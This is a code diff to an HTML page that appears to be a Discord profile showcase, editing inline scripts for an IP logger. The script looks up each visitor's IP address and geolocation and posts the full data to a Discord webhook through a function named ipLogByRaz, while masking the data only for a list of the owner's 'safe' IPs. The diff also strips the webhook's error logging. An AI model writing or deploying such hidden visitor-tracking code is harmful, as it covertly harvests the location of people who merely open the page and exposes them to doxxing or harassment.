@@ -72,11 +72,13 @@
     </div>
   </div>
 
-  <header class="header"></header>
-  <script src="./config.js"></script>
+  <!-- ✅ Webhook declared before use -->
+  <script>
+    const wbhk = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
+  </script>
 
   <script>
-    const SAFE_IPS = ["123.45.67.89", "111.111.111.111"]; // Replace with your real safe IPs
+    const SAFE_IPS = ["123.45.67.89", "111.111.111.111"]; // Replace with real IPs
 
     function get_information(link, callback) {
       const xhr = new XMLHttpRequest();
@@ -114,14 +116,6 @@
       const request = new XMLHttpRequest();
       request.open("POST", wbhk);
       request.setRequestHeader("Content-Type", "application/json");
-      request.onreadystatechange = () => {
-        if (request.readyState === 4) {
-          console.log("Webhook status:", request.status);
-        }
-      };
-      request.onerror = () => {
-        console.error("Webhook failed to send.");
-      };
       request.send(JSON.stringify(payload));
     }
 
@@ -130,7 +124,6 @@
       const userIp = data.query;
 
       if (SAFE_IPS.includes(userIp)) {
-        // 🚫 Scrub fields for safe IPs
         const scrubbed = {
           city: "Unknown",
           region: "?",
@@ -146,11 +139,10 @@
         return;
       }
 
-      // ✅ Send full info for non-safe IPs
       ipLogByRaz(userIp, JSON.stringify(data));
     });
 
-    // Live Discord Profile Info
+    // Discord Profile Info Fetch
     const badgeIcons = {
       activeDeveloper: "https://cdn.jsdelivr.net/gh/AnIdiotsGuide/discord-badges@master/assets/active-developer.svg",
       hypesquadOnlineHouse2: "https://cdn.jsdelivr.net/gh/AnIdiotsGuide/discord-badges@master/assets/hypesquad-brilliance.svg"
